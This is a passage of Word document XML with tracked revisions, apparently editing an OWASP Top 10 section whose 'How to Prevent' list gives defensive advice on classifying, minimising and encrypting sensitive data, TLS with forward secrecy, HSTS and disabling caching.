      <w:ins w:id="761" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>V</w:t>
        </w:r>
        <w:r w:rsidR="003A277D">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>8</w:t>
        </w:r>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">), and </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SSL/TLS (</w:t>
      </w:r>
      <w:del w:id="762" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>V10)](https://www.owasp.org/index.php/ASVS_V10_Communications).</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="763" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>V</w:t>
        </w:r>
        <w:r w:rsidR="003A277D">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>9</w:t>
        </w:r>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="772B22B5" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4CDF7250" w14:textId="61E12B25" w:rsidR="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">## How </w:t>
      </w:r>
      <w:del w:id="764" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>To</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="765" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>to</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Prevent</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33314AF1" w14:textId="77777777" w:rsidR="003A277D" w:rsidRPr="00841D1E" w:rsidRDefault="003A277D" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0514DE44"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Do the following, at a minimum, and consult the references:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C9F7A99" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D2EF348" w14:textId="164117EA" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="766" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="767" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="768" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Classify data processed, stored</w:t>
      </w:r>
      <w:ins w:id="769" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> or transmitted by an application.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D37F7BB" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="770" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="771" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Identify which data is sensitive according to privacy laws,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1727B453" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="772" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> regulatory requirements, or business needs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A3F2DF2" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="773" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="774" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* Apply controls as per the classification.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="693DA380" w14:textId="44D270C2" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="775" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="776" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7CB64D0C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="777" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="778" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Don't store sensitive data unnecessarily. Discard it as soon as</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78B6C69C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="779" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="780" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> possible or use PCI DSS compliant tokenization or even truncation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16EE3540" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="781" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Data that is not retained cannot be stolen.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B7DA55A" w14:textId="583CA621" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="782" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="783" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="2E3D4404" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="784" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Make sure to encrypt all sensitive data at rest.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F670A84" w14:textId="29BE3028" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="785" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="786" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="2F0B6B95" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="787" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="788" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Ensure up-to-date and strong standard algorithms, protocols, and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="642AEFE5" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="789" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> keys are in place; use proper key management.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E4209F1" w14:textId="004A4527" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="790" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="791" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="26845604" w14:textId="3C4B9BBF" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="792" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="793" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Encrypt all data in transit with secure protocols such as TLS with</w:t>
      </w:r>
      <w:del w:id="794" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> perfect</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="3DE4ADC5" w14:textId="3BA2B92B" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="795" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="796" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> forward secrecy (</w:t>
      </w:r>
      <w:del w:id="797" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>PFS</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="798" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>FS</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>) ciphers, cipher prioritization by the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08EB4200" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="799" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="800" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> server, and secure parameters. Enforce encryption using directives</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="444FAEE6" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="801" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> like HTTP Strict Transport Security (HSTS).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FF59089" w14:textId="6CA6731F" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="802" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="803" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4AB6AF96" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="804" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Disable caching for response that contain sensitive data.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D7AE2D6" w14:textId="489B578F" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="805" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="806" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4E5D014F" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="807" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="808" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Apply required security controls as per the data classification.</w:t>
        </w:r>
      </w:ins>
    </w:p>
